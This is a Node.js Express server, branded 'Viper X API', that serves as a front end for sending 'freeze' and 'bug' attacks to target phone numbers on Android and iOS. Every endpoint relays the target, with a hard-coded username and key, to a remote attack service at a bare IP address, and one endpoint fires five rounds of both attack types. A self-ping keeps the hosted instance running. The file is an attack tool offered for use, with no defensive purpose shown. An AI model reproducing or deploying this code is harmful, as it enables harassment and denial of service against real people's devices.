// --- Imports ---
import express from 'express';
import axios from 'axios';

// --- Express App Setup ---
const app = express();

// --- Homepage ---
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <title>Viper X API</title>
        <style>
          body {
            background: linear-gradient(to right, #2e026d, #6c1cdb);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0 20px;
            text-align: center;
          }
          h1 { font-size: 3rem; margin-bottom: 0.3rem; }
          h2 { font-size: 1.3rem; font-weight: 400; margin-bottom: 2rem; }
          p { margin-bottom: 1rem; font-size: 1.1rem; }
          code {
            background: rgba(255,255,255,0.1);
            padding: 4px 8px;
            border-radius: 5px;
            font-size: 1rem;
          }
        </style>
      </head>
      <body>
        <h1>Viper X API</h1>
        <h2>Advanced Freeze/Bug Sender Powered by Gabimaru Tech</h2>
        <p><strong>Send Android Freeze:</strong><br><code>/api/freeze?target=234XXXXXXXXXX&type=andros</code></p>
        <p><strong>Send iOS Freeze:</strong><br><code>/api/freeze?target=234XXXXXXXXXX&type=ios</code></p>
        <p><strong>Send Bug Combo:</strong><br><code>/api/send?target=234XXXXXXXXXX</code></p>
      </body>
    </html>
  `);
});

// --- Freeze API ---
app.get('/api/freeze', async (req, res) => {
  const { target, type } = req.query;
  const username = 'gabi';
  const key = 'Y59J';

  if (!target || !type) {
    return res.status(400).send('Missing ?target= & ?type=andros|ios');
  }

  const url = `http://159.223.50.150:2000/oblivionCore?target=${target}&mode=${type}&username=${username}&key=${key}`;

  try {
    const response = await axios.get(url);
    res.send({ success: true, data: response.data });
  } catch (err) {
    res.status(500).send({
      error: 'BUG API failed',
      detail: err.response?.data || err.message,
    });
  }
});

// --- Send Bug Combo ---
app.get('/api/send', async (req, res) => {
  const { target } = req.query;
  const username = 'gabi';
  const key = 'Y59J';

  if (!target) return res.status(400).send('Missing ?target=');

  const delay = (ms) => new Promise((r) => setTimeout(r, ms));
  const androsURL = `http://159.223.50.150:2000/oblivionCore?target=${target}&mode=andros&username=${username}&key=${key}`;
  const iosURL = `http://159.223.50.150:2000/oblivionCore?target=${target}&mode=ios&username=${username}&key=${key}`;

  try {
    for (let i = 0; i < 5; i++) {
      console.log(`🚀 Round ${i + 1} to ${target}`);
      await axios.get(androsURL);
      await delay(1000);
      await axios.get(iosURL);
      await delay(1000);
    }

    res.send({ success: true, message: `BUG combo sent to ${target}` });
  } catch (err) {
    res.status(500).send({
      error: 'BUG failed',
      detail: err.response?.data || err.message,
    });
  }
});

// --- Start Server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});

// --- Auto Ping Every 2 Minutes ---
setInterval(() => {
  axios
    .get('https://whatsapp-invi-api.onrender.com')
    .then(() => console.log('📡 Self-ping successful'))
    .catch((err) => console.error('❌ Self-ping failed:', err.message));
}, 120000); // 2 minutes